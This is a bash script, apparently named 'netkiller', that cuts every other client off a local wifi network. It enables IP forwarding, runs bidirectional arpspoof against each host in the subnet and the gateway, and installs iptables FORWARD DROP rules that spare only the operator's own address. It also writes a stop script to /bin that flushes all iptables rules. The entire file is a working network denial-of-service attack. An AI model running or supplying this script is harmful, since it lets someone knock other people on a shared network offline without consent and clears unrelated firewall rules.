#!/bin/bash

set -e

INTERFACE="wlan0"

if ! command -v ipcalc >/dev/null; then
    echo "ipcalc not found. Please install it."
    exit 1
fi

if [ "$EUID" -ne 0 ]; then
    echo "Run this as root."
    exit 1
fi

GATEWAY=$(ip route | awk '/default/ {print $3}')
MYIP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1)
NETWORK_CIDR=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}')

# Calculate subnet with ipcalc
HOSTMIN=$(ipcalc "$NETWORK_CIDR" | awk '/HostMin/ {print $2}')
HOSTMAX=$(ipcalc "$NETWORK_CIDR" | awk '/HostMax/ {print $2}')

# IP to decimal
ip2dec() {
    IFS=. read -r a b c d <<< "$1"
    echo "$(( (a << 24) + (b << 16) + (c << 8) + d ))"
}

# Decimal to IP
dec2ip() {
    local dec=$1
    echo "$(( (dec >> 24) & 255 )).$(( (dec >> 16) & 255 )).$(( (dec >> 8) & 255 )).$(( dec & 255 ))"
}

MIN=$(ip2dec "$HOSTMIN")
MAX=$(ip2dec "$HOSTMAX")

# Enable IP forwarding
sysctl -w net.ipv4.ip_forward=1

# Cleanup function to remove iptables rules and kill arpspoof
cat > /bin/netkiller-stop << 'EOF'
echo "Cleaning up and restoring the wifi clients connections..."
iptables -F
iptables -F FORWARD
pkill -f arpspoof
EOF
chmod 755 /bin/netkiller-stop

# Drop all packets except those from/to MYIP and GATEWAY
iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP

for (( i=MIN; i<=MAX; i++ )); do
    IP=$(dec2ip "$i")
    # Skip self and gateway
    if [[ "$IP" == "$MYIP" || "$IP" == "$GATEWAY" ]]; then
        continue
    fi
    # Bidirectional Arp Spoofing policy
    arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
done

echo "Blocking all the wifi clients connections in $NETWORK_CIDR except your $MYIP and $GATEWAY."
echo " "
echo "To stop, run: netkiller-stop"
